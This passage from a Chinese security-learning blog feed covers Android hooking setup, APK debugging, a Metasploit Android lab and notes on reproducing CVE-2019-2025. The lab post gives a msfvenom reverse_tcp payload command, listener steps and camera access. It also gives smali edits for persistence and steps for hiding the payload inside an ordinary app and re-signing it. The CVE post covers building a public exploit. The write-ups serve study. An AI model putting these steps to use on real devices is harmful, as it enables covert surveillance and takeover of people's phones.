class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># For more information about using CMake with Android Studio, read the</span><br><span class="line"># documentation: https:&#x2F;&#x2F;d.android.com&#x2F;studio&#x2F;projects&#x2F;add-native-code.html</span><br><span class="line"></span><br><span class="line"># Sets the minimum version of CMake required to build the native library.</span><br><span class="line">#CMakeLists.txt</span><br><span class="line">cmake_minimum_required(VERSION 3.4.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set(lib_src_DIR $&#123;CMAKE_SOURCE_DIR&#125;&#x2F;src&#x2F;main&#x2F;jni)</span><br><span class="line">include_directories(</span><br><span class="line">        $&#123;CMAKE_SOURCE_DIR&#125;&#x2F;src&#x2F;main&#x2F;jni</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Creates and names a library, sets it as either STATIC</span><br><span class="line"># or SHARED, and provides the relative paths to its source code.</span><br><span class="line"># You can define multiple libraries, and CMake builds them for you.</span><br><span class="line"># Gradle automatically packages shared libraries with your APK.</span><br><span class="line"></span><br><span class="line">add_library( # Sets the name of the library.</span><br><span class="line">      # 设置so文件名称.</span><br><span class="line">       module.cy</span><br><span class="line"></span><br><span class="line">       # Sets the library as a shared library.</span><br><span class="line">       SHARED</span><br><span class="line">       # 设置这个so文件为共享.</span><br><span class="line"></span><br><span class="line">       # Provides a relative path to your source file(s).</span><br><span class="line">       # 设置这个so文件为共享.</span><br><span class="line">       src&#x2F;main&#x2F;jni&#x2F;module.cpp)</span><br><span class="line"></span><br><span class="line"># Searches for a specified prebuilt library and stores the path as a</span><br><span class="line"># variable. Because CMake includes system libraries in the search path by</span><br><span class="line"># default, you only need to specify the name of the public NDK library</span><br><span class="line"># you want to add. CMake verifies that the library exists before</span><br><span class="line"># completing its build.</span><br><span class="line"></span><br><span class="line">find_library( # Sets the name of the path variable.</span><br><span class="line">       log-lib</span><br><span class="line"></span><br><span class="line">       # Specifies the name of the NDK library that</span><br><span class="line">       # you want CMake to locate.</span><br><span class="line">       log )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_library(</span><br><span class="line">        substrate</span><br><span class="line">        SHARED</span><br><span class="line">        IMPORTED</span><br><span class="line">)</span><br><span class="line">set_target_properties(</span><br><span class="line">        substrate</span><br><span class="line">        PROPERTIES IMPORTED_LOCATION</span><br><span class="line">        $&#123;lib_src_DIR&#125;&#x2F;libsubstrate.so</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add_library(</span><br><span class="line">        substrate-dvm</span><br><span class="line">        SHARED</span><br><span class="line">        IMPORTED</span><br><span class="line">)</span><br><span class="line">set_target_properties(</span><br><span class="line">        substrate-dvm</span><br><span class="line">        PROPERTIES IMPORTED_LOCATION</span><br><span class="line">        $&#123;lib_src_DIR&#125;&#x2F;libsubstrate-dvm.so</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Specifies libraries CMake should link to your target library. You</span><br><span class="line"># can link multiple libraries, such as libraries you define in this</span><br><span class="line"># build script, prebuilt third-party libraries, or system libraries.</span><br><span class="line"></span><br><span class="line">target_link_libraries( # Specifies the target library.</span><br><span class="line">            # 制定目标库.</span><br><span class="line">            module.cy</span><br><span class="line">            substrate</span><br><span class="line">            substrate-dvm</span><br><span class="line"></span><br><span class="line">            # Links the target library to the log library</span><br><span class="line">            # included in the NDK.</span><br><span class="line">            $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure><p>引入第三方的头文件，需要指定其路径：</p><p><img src="https://uploader.shimo.im/f/Dx3ZeJIsULINnQ3C.png!thumbnail" alt="img"></p><p>引入的第三方库，需要在CMakeLists中指定名字和路径：</p><p><img src="https://uploader.shimo.im/f/pFo4F8Y1T3UrwEhN.png!thumbnail" alt="img"></p><p>3）AndroidManifest.xml配置：</p><p>添加权限：</p><p><code>&lt;uses-permission android:name=&quot;cydia.permission.SUBSTRATE&quot; /&gt;</code></p><p>Application标签的属性：<code>android:hasCode=&quot;false&quot;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Java层Hook工具，应用较多的有Xposed和Friday；so层Hook工具常用Substrate。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Frida：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;动态插桩工具，使用Python、JavaScript共同完成。主要hook逻辑在JavaS
      
    
    </summary>
    
    
      <category term="工具配置笔记" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>Android Studio调试apk备忘录-copy</title>
    <link href="http://yoursite.com/2020/03/26/AndroidStudio%E8%B0%83%E8%AF%95apk%E5%A4%87%E5%BF%98%E5%BD%95-copy/"/>
    <id>http://yoursite.com/2020/03/26/AndroidStudio%E8%B0%83%E8%AF%95apk%E5%A4%87%E5%BF%98%E5%BD%95-copy/</id>
    <published>2020-03-26T08:24:05.000Z</published>
    <updated>2020-03-26T08:33:32.077Z</updated>
    
    <content type="html"><![CDATA[<p>1.反编译apk: <code>apktool d apkname.apk</code></p><p>2.打开Android Studio，导入程序目录</p><p><img src="%E5%AF%BC%E5%85%A5.PNG" alt=""></p><p>选择该目录，然后，一路Next, 最后Finish。  </p><p><img src="import1.PNG" alt=""></p><p><img src="impoer2.PNG" alt=""></p><p><img src="import3.PNG" alt=""></p><p><img src="import4.PNG" alt=""></p><p>导入目录后，切换至Project模式，右键smali目录-&gt;Mark Derictory as -&gt; Sources Root，然后在需要的位置下断点。</p><p>4、 打开模拟器（这里用的MuMu），安装待调试应用。<strong>注意</strong>：若使用真机，需要先反编译apk文件，将应用的AndroidManifest.xml中的Application标签中加上android:debuggable=”true”，再重新回编译成apk包，并签名，然后安装至测试机，否则不能调试。</p><p>5、获取入口Activity:<br><code>adb shell dumpsys activity top | grep ACTIVITY</code><br>result示例：<br>com.k7game.app.black7.sdy/com.k7game.app.AppActivity</p><p>6、以debug状态打开此Activity<br><code>adb shell am start -D -n “Activity信息”</code><br>示例：<br>adb shell am start -D -n com.k7game.app.black7.sdy/com.k7game.app.AppActivity</p><p>7、获取应用pid<br><code>adb shell ps | grep &quot;包名&quot;</code><br>示例：<br>adb shell ps | grep com.k7game.app.black7.sdy<br>result示例:<br>u0_a35 3993 255 1558152 52500 futex_wait b7267fd2 S com.k7game.app.black7.sdy<br>则pid为： 3993</p><p>8、设置端口转发<br><code>adb forward tcp:8700 jdwp: “pid”</code><br>示例：<br>adb forward tcp:8700 jdwp:3993</p><p>9、点击Android Studio的调试图标，并选择待调试进程，即可进行后续调试。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.反编译apk: &lt;code&gt;apktool d apkname.apk&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.打开Android Studio，导入程序目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;%E5%AF%BC%E5%85%A5.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;选择该
      
    
    </summary>
    
    
      <category term="工具配置笔记" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>msf操作Android设备实验-copy</title>
    <link href="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/"/>
    <id>http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/</id>
    <published>2020-03-26T07:37:01.000Z</published>
    <updated>2020-07-16T05:49:02.740Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p><strong>写在前面的感想：</strong>做这个实验的时候，才发现一直以为的“手机不root就很安全”实在是太天真了。 有心人想窃取个人隐私简直轻而易举，需要了解攻击者的手法，不断提高防御水平，才能“知己知彼，百战不殆”。</p><p><strong>维护信息安全，人人有责。</strong></p><h2 id="一、生成payload程序"><a href="#一、生成payload程序" class="headerlink" title="一、生成payload程序"></a>一、生成payload程序</h2><p>kali ip为：<em>172.16.20.98</em>； Android设备ip为：<em>172.16.20.81</em>。打开kali终端，执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.20.98 lport&#x3D;4444 R &gt; &#x2F;opt&#x2F;apk.apk</span><br></pre></td></tr></table></figure><p>命令中的lhost是kali的ip，lport指定一个端口。</p><p><img src="apk.PNG" alt=""></p><p>将生成的apk文件安装至Android设备中备用。 安装成功后桌面会多一个名字为MainActivity的应用图标。</p><h2 id="二、连接Android设备"><a href="#二、连接Android设备" class="headerlink" title="二、连接Android设备"></a>二、连接Android设备</h2><p>执行以下步骤：</p><ol><li>在kali终端输入<code>msfconsole</code>，进入msf环境</li><li>启动监听模块：<code>use exploit/multi/handler</code></li><li>设置payload：<code>set payload android/meterpreter/reverse_tcp</code></li><li>设置LHOST: <code>set lhost 172.16.20.98</code></li><li>设置LPORT：<code>set lport 4444</code></li><li>最后执行：<code>exploit</code></li></ol><p><img src="%E6%8D%95%E8%8E%B7.PNG" alt=""></p><p>点击MainActivity图标（点击之后桌面没有反应，是正常的），可以在kali终端看到连接已经建立：</p><p><img src="%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5.PNG" alt=""></p><p><strong>功能：</strong>可以输入<code>help</code>命令查看有哪些操作，这里仅举一些例子，如查看设备信息、是否root、在设备上毫无异常的情况下打开摄像头等等</p><p><img src="%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E4%BF%A1%E6%81%AF.PNG" alt=""></p><p><img src="%E6%89%93%E5%BC%80%E6%91%84%E5%83%8F%E5%A4%B4.PNG" alt=""></p><p><img src="webcam.PNG" alt=""></p><p>但是，这个连接是在APP启动的时候建立的，稳定性比较差，一旦断网就会断开连接，且不会自动重连。</p><h2 id="二、稳定性增强版"><a href="#二、稳定性增强版" class="headerlink" title="二、稳定性增强版"></a>二、稳定性增强版</h2><p>目前，解决稳定性问题最普遍的方法是，在建立连接后，迅速将以下脚本复制到Android设备上，并执行：</p><p><code>#!/bin/bash</code><br><strong><code>while</code></strong><code>true</code><br><strong><code>do</code></strong><code>am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity</code><br><code>sleep 20</code><br><strong><code>done</code></strong></p><p>即定时重启Payload应用程序。但是，在没有root的设备上执行脚本会有权限错误。。。。因此，考虑修改Payload应用程序的源码。</p><p>反编译该apk文件，得到启动payload的关键代码：</p><p><em>MainActivity.java:</em><br><code>protected void onCreate(Bundle arg1) {super.onCreate(arg1);MainService.startService(((Context)this));this.finish();}</code></p><p><em>MainService.java:</em><br><code>public int onStartCommand(Intent arg2, int arg3, int arg4) {Payload.start(((Context)this));return 1;}</code></p><p>可以看到在MainService类的onStartCommand方法中启动了Payload。</p><p>思路一是重写MainService的onDestroy方法，在这个方法中加入启动Payload的代码。但是，payload连接断开时，MainService服务并没有结束，不会调用onDestroy方法，这里行不通。</p><p>思路二是通过在onStartCommand方法中添加AlarmManager定时器，定时执行payload，保证payload一直连接。即将onStartCommand方法修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public int onStartCommand(Intent intent, int flags, int startId) &#123; Payload.start(this); </span><br><span class="line">AlarmManager manager &#x3D; (AlarmManager) getSystemService(ALARM_SERVICE); </span><br><span class="line">int restarttime &#x3D; 60 * 1000; &#x2F;&#x2F; one minute </span><br><span class="line">long triggerAtTime &#x3D; SystemClock.elapsedRealtime() + restarttime; </span><br><span class="line">Intent i &#x3D; new Intent(&quot;METASPLOIT&quot;); </span><br><span class="line">PendingIntent pi &#x3D; PendingIntent.getBroadcast(this, 0, i, 0); manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi); </span><br><span class="line">return START_STICKY; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的修改反编译的smali代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.method public onStartCommand(Landroid&#x2F;content&#x2F;Intent;II)I .locals 7 invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;Payload;-&gt;start(Landroid&#x2F;content&#x2F;Context;)V const-string v0, &quot;alarm&quot; </span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;getSystemService(Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;Object; </span><br><span class="line">move-result-object v0 </span><br><span class="line">check-cast v0, Landroid&#x2F;app&#x2F;AlarmManager; </span><br><span class="line">.local v0, </span><br><span class="line">&quot;manager&quot;:Landroid&#x2F;app&#x2F;AlarmManager;</span><br><span class="line">const v1, 0xea60 </span><br><span class="line">.local v1, &quot;restarttime&quot;:I </span><br><span class="line">invoke-static &#123;&#125;, Landroid&#x2F;os&#x2F;SystemClock;-&gt;elapsedRealtime()J </span><br><span class="line">move-result-wide v2 </span><br><span class="line">int-to-long v4, v1 </span><br><span class="line">add-long&#x2F;2addr v2, v4 </span><br><span class="line">.local v2, &quot;triggerAtTime&quot;:J </span><br><span class="line">new-instance v4, Landroid&#x2F;content&#x2F;Intent; </span><br><span class="line">const-string v5, &quot;METASPLOIT&quot; </span><br><span class="line">invoke-direct &#123;v4, v5&#125;, Landroid&#x2F;content&#x2F;Intent;-&gt;&lt;init&gt;(Ljava&#x2F;lang&#x2F;String;)V .local v4, &quot;i&quot;:Landroid&#x2F;content&#x2F;Intent; </span><br><span class="line">const&#x2F;4 v5, 0x0 </span><br><span class="line">invoke-static &#123;p0, v5, v4, v5&#125;, Landroid&#x2F;app&#x2F;PendingIntent;-&gt;getBroadcast(Landroid&#x2F;content&#x2F;Context;ILandroid&#x2F;content&#x2F;Intent;I)Landroid&#x2F;app&#x2F;PendingIntent; </span><br><span class="line">move-result-object v5 </span><br><span class="line">.local v5, &quot;pi&quot;:Landroid&#x2F;app&#x2F;PendingIntent; </span><br><span class="line">const&#x2F;4 v6, 0x2 </span><br><span class="line">invoke-virtual &#123;v0, v6, v2, v3, v5&#125;, Landroid&#x2F;app&#x2F;AlarmManager;-&gt;set(IJLandroid&#x2F;app&#x2F;PendingIntent;)V </span><br><span class="line">const&#x2F;4 v6, 0x1 </span><br><span class="line">return v6</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>另外，需要修改MainBroadcastReceiver的onReceiver方法中的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void onReceive(Context context, Intent intent) &#123; MainService.startService(context); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的smali为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.method public onReceive(Landroid&#x2F;content&#x2F;Context;Landroid&#x2F;content&#x2F;Intent;)V .locals 0 </span><br><span class="line">invoke-static &#123;p1&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V </span><br><span class="line">return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>然后，在Manifext中的MainBroadcastReceiver模块的intent-filter中增加：<br><code>&lt;</code><strong><code>action</code></strong><code>android:name=&quot;METASPLOIT&quot; /&gt;</code></p><p>smali修改完成后执行<code>apktool apk -o apk_unsigned.apk</code>，得到重新打包的payload apk；<br>然后执行<code>jarsigner -verbose -keystore demo.keystore -signedjar apk_signed.apk apk_unsigned.apk demo.keystore</code> 对应用进行签名（需要先生成KEYSTORE文件，并将此文件放在apk_unsigned.apk同一目录下）；<br>最后将签过名的apk_signed.apk安装至目标Android设备即可。</p><p>结果：</p><ol><li>修改前和修改后的Payload应用程序均会被Android设备检测出风险，需要增加免杀；</li><li>连接依然不稳定。。。。</li></ol><h2 id="三、隐蔽性增强版"><a href="#三、隐蔽性增强版" class="headerlink" title="三、隐蔽性增强版"></a>三、隐蔽性增强版</h2><p>一开始考虑修改Payload应用程序的应用名和图标，伪装成其他应用，诱导用户安装。但是，反编译payload apk文件后，发现资源目录下没有drawable目录，无法更换图标。。。。。</p><p>只好换个思路，把payload应用程序嵌入某个普通app中。</p><p>首先，反编译两个应用。</p><ol><li>打开将Payload应用程序 的smali目录复制到普通APP的相应目录下；</li><li>打开普通APP的AndroidManifest.xml文件，将Payload应用程序 的Manifest中申请的权限复制过来；</li><li>再把Payload应用程序 的Manifest中声名的组件复制到普通APP的Manifest文件中， 注意普通应用包名和 Payload应用程序 包名不同，复制过来后需要把组件名补全 ；</li><li>在普通APP的Manifest中找到有如下intent-filter标签的Activity：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt; </span><br><span class="line"> &lt;action android:name&#x3D;&quot;android.intent.action.MAIN&quot; &#x2F;&gt;</span><br><span class="line"> &lt;category android:name&#x3D;&quot;android.intent.category.LAUNCHER&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;intent-filter&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>在smali目录中，打开上一步找到的Activity，找到onCreate方法，在第一行插入Payload服务的启动语句，如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.method protected onCreate(Landroid&#x2F;os&#x2F;Bundle;)V </span><br><span class="line">invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V </span><br><span class="line">.locals 6 </span><br><span class="line">.param p1, &quot;savedInstanceState&quot; </span><br><span class="line"># Landroid&#x2F;os&#x2F;Bundle;.............end method</span><br></pre></td></tr></table></figure><ol start="6"><li>重新打包、签名该应用。</li></ol><p>即可完成对 Payload应用程序 的伪装。但是，仍然会被设备检测出风险。</p><p>参考文献：<br>【1】 <a href="https://www.freebuf.com/sectool/141234.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/141234.html</a><br>【2】 <a href="https://www.freebuf.com/articles/terminal/188585.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/terminal/188585.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写在前面的感想：&lt;/strong&gt;做这个实验的时候，才发现一直以为的“手机不r
      
    
    </summary>
    
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>复现CVE-2019-2025时踩过的坑-copy</title>
    <link href="http://yoursite.com/2020/03/26/%E5%A4%8D%E7%8E%B0CVE-2019-2025%E6%97%B6%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91-copy/"/>
    <id>http://yoursite.com/2020/03/26/%E5%A4%8D%E7%8E%B0CVE-2019-2025%E6%97%B6%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91-copy/</id>
    <published>2020-03-26T07:03:23.000Z</published>
    <updated>2020-03-26T07:32:01.807Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p>上篇文章沿着看雪论坛大神分享的思路（<a href="https://bbs.pediy.com/thread-254812.htm）分析了Android" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254812.htm）分析了Android</a> Binder的use_after_free漏洞，这篇文章记录下复现漏洞时踩过的坑。</p><p>首先，在<a href="https://github.com/jltxgcy/CVE_2019_2025_EXP下载源码。" target="_blank" rel="noopener">https://github.com/jltxgcy/CVE_2019_2025_EXP下载源码。</a></p><p>可以看到工程需要在aosp环境下编译，然后，再将编译得到的可执行文件pwn放入设备中执行。</p><p>由于Android源码的编译需要在Linux环境下执行，而我的环境是<strong>win10</strong>，解决的方法有三个：</p><p>1、使用docker</p><p>2、Linux虚拟机</p><p>3、再装一个Linux系统（win10和Linux双系统，可以想象有无数个坑，果断放弃这一种）</p><h2 id="一、使用Docker配置AOSP"><a href="#一、使用Docker配置AOSP" class="headerlink" title="一、使用Docker配置AOSP"></a>一、使用Docker配置AOSP</h2><p>首先，下载Docker for Windows并进行安装。安装完成后，启动Docker，会弹出错误提示，要求启动Hyper-V。（但是启动Hyper-V后，VMware虚拟机就打不开了。。。）  </p><p>启动Hyper-V步骤：</p><ol><li>打开控制面板，点击“程序”选项，然后选择“启动或关闭Windows功能”；</li><li>在Windows功能窗口中，找到Hyper-V，在前面打勾，点击确定；</li><li>更改完成后，根据提示，重启系统</li></ol><p>启动docker，右击任务栏右下角的docker图标，点击Ketimatic，启动桌面。然后，在搜索栏输入aosp，点击create下载。</p><p>离线下载Android源码，然后配置 aosp路径。需要先在docker的Settings中设置Shared Drivers，否则docker不能访问主机的文件。具体设置、碰到的问题和解决方法参考：<a href="https://newsn.net/say/docker-share-folder.html" target="_blank" rel="noopener">https://newsn.net/say/docker-share-folder.html</a></p><p>（设置后，依然不能从docker打开的powershell中访问程序的文件）</p><h2 id="二、使用Linux虚拟机"><a href="#二、使用Linux虚拟机" class="headerlink" title="二、使用Linux虚拟机"></a>二、使用Linux虚拟机</h2><p>这里使用的VMware，安装了Ubuntu16.04。</p><h4 id="1、下载aosp镜像"><a href="#1、下载aosp镜像" class="headerlink" title="1、下载aosp镜像"></a>1、下载aosp镜像</h4><p>官方教程地址为：<a href="https://source.android.com/setup/build/downloading。由于不能访问google官方AOSP，我们使用清华源下载。" target="_blank" rel="noopener">https://source.android.com/setup/build/downloading。由于不能访问google官方AOSP，我们使用清华源下载。</a></p><p>首先，下载repo工具。</p><figure class="highlight plain"><figcaption><span>~/binPATH</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">*epo是Google开发的用于管理Android版本库的一个工具，是用Python对Git工具做了封装，简化了复杂的百多个Git库管理。*</span><br><span class="line"></span><br><span class="line">然后，下载和同步aosp。</span><br></pre></td></tr></table></figure><ol><li>wget -c <a href="https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar</a> # 下载初始化包</li><li>tar xf aosp-latest.tar</li><li>cd AOSP # 解压得到的 AOSP 工程目录# 这时 ls 的话什么也看不到，因为只有一个隐藏的 .repo 目录</li><li>repo sync # 正常同步一遍即可得到完整目录# 或 repo sync -l 仅checkout代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">下载的aosp-latest.tar包将近60G的数据，且不能断点续传，建议选择网络稳定且网速较快的低峰时间下载。下载完成之后，解压缩，发现得到一个空的aosp目录，因为里面只有一个隐藏的.repo目录。需要同步一下才能得到完整的目录。同步的过程同样要很长的时间，耐心等待一下。。。</span><br><span class="line"></span><br><span class="line">![](aosp.PNG)</span><br><span class="line"></span><br><span class="line">### 2、编译pwn工程</span><br><span class="line"></span><br><span class="line">编译过程对性能要求比较高，虚拟机内存最好分配允许的最大内存。一开始只有8G内存，给虚拟机分配了6个G，每执行一个命令就要等半天才有反馈。后来扩展了8G，虚拟机内存分到了13.4G，速度肉眼可见的飞跃。</span><br><span class="line"></span><br><span class="line">当然了，这里我们只编译单个模块，而不是整个系统。内存只有6G的时候，尝试编译了一次整个系统，果不其然，out of memory了。</span><br><span class="line"></span><br><span class="line">下面是编译的具体过程：</span><br><span class="line"></span><br><span class="line">**1.** 进入aosp目录下, 将下载的CVE_2019_2015_EXP.zip解压至本目录；</span><br><span class="line"></span><br><span class="line">**2.** 初始化环境，执行：&#96;source build&#x2F;envsetup.sh &#96;。否则后续命令执行会报错：</span><br></pre></td></tr></table></figure>The program ‘XX’ is currently not installed.<pre><code></code></pre></li></ol><p><strong>3.</strong> 执行<code>lunch</code>，选择编译的平台。lunch命令执行后如左图， 在<a href="https://source.android.google.cn/setup/build/running查看代号对应的设备如右图：" target="_blank" rel="noopener">https://source.android.google.cn/setup/build/running查看代号对应的设备如右图：</a></p><p><img src="%E8%AE%BE%E5%A4%87%E4%BB%A3%E5%8F%B7.PNG" alt=""></p><p><img src="aosp%E8%AE%BE%E5%A4%87.PNG" alt=""></p><p><strong>4.</strong> 切换到CVE_2019_2025_EXP目录，执行<code>mm</code> 。或者在aosp目录下，直接执行<code>mm pwn</code> (pwn是模块名字)。</p><p>m、mm、mmm命令可以只编译单独模块，而不用编译整个Android系统。</p><p>经过短则几分钟，长则半小时（不同性能）的编译后，果不其然，编译失败了。。。。</p><p>不过没关系，失败是常态，第一次就成功的，才是偶然。</p><p>报错内容：</p><p><img src="%E6%8A%A5%E9%94%99.PNG" alt=""></p><p>是一个整型溢出错误，考虑到这是复现漏洞的源码，是经过复现漏洞的大神测试过的，那就只能是编译时的问题，而不是代码问题。经过一番周折（后续细说）才意识到，是lunch的时候选的编译平台有问题，默认的aosp_arm-eng是32位的，应该选64位的平台。重新执行lunch命令，选择aosp_arm64_eng，再次编译，终于成功了！</p><p><strong>一番周折：</strong></p><p>第一次编译结束，出现了整型溢出问题。而为了解决整型溢出问题导致的内存访问或内存分配关联变量中出现信息泄露，Android7.0中添加了有符号和无符号的整型溢出排错程序。于是，脑子一热，决定把源码切到Android6.0。</p><p>经过漫长的同步源码后，终于，又失败了。。。</p><p>这次的问题不再是整型溢出错误，而是/…/Android.mk：No such file or dir. 根据网上资料，尝试了几次，依次把报错的目录删掉，终于不报这个错了。 然而，万万没想到，又开始报整型溢出。。。</p><p>此时，才意识到可能是lunch的时候选的平台是32位的，而程序需要在64位的环境下编译。</p><p>于是，又把源码切回latest，重新选择64位的平台编译，这才成功。</p><p><strong>5.</strong> 执行pwn，即连接设备，使用adb push将pwn文件放在设备/data/local/tmp目录下，再执行<code>./pwn</code></p><p>然后，又报错了！</p><p>x86_64(Pixel 2):</p><p><img src="x86.PNG" alt=""></p><p>arm64(Pixel 2):</p><p><img src="arm64.PNG" alt=""></p><h3 id="3、编译exploitdb上的exp"><a href="#3、编译exploitdb上的exp" class="headerlink" title="3、编译exploitdb上的exp"></a>3、编译exploitdb上的exp</h3><p> 地址：<a href="https://www.exploit-db.com/exploits/46503" target="_blank" 